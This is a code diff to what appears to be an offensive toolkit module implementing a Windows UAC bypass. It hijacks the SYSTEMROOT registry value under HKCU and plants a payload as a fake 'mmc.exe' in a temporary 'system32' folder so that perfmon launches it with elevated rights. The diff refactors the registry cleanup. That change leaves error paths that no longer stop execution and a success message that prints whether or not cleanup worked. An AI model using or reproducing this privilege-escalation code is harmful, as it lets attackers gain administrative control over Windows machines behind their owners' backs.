@@ -18,6 +18,16 @@ perfmon_info = {
 }
 
 
+def perfmon_cleanup(path):
+	# Also add removal of directory and binary, if fail put
+	# only warning as indication
+	print_info("Performing cleaning")
+	if registry().remove_key(hkey="hkcu", path=path, name="SYSTEMROOT", delete_key=False):
+		print_success("Successfully cleaned up")
+	else:
+		print_error("Unable to cleanup")
+		return False
+
 def perfmon(payload):
 	if payloads().exe(payload):
 		if not os.path.exists(payload):
@@ -38,7 +48,8 @@ def perfmon(payload):
 				os.makedirs(os.path.join(tempfile.gettempdir(), "system32"))
 			except Exception as error:
 				print_error("Unable to create directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
-				return False
+				if "error" in Constant.output:
+					perfmon_cleanup(path)
 			else:
 				print_success("Successfully created directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 		else:
@@ -55,10 +66,12 @@ def perfmon(payload):
 			shutil.copy(payload, os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
 		except shutil.Error as error:
 			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
-			return False
+			if "error" in Constant.output:
+				perfmon_cleanup(path)
 		except IOError as error:
 			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
-			return False
+			if "error" in Constant.output:
+				perfmon_cleanup(path)
 		else:
 			print_success("Successfully copied payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 
@@ -71,15 +84,13 @@ def perfmon(payload):
 				print_success("Successfully spawned process ({})".format(payload))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				return False
+				if "error" in Constant.output:
+					perfmon_cleanup(path)
 
 		time.sleep(5)
 
-		if registry().remove_key(hkey="hkcu", path=path, name="SYSTEMROOT", delete_key=False):
-			print_success("Successfully cleaned up, enjoy!")
-		else:
-			print_error("Unable to cleanup")
-			return False
+		if not perfmon_cleanup(path):
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
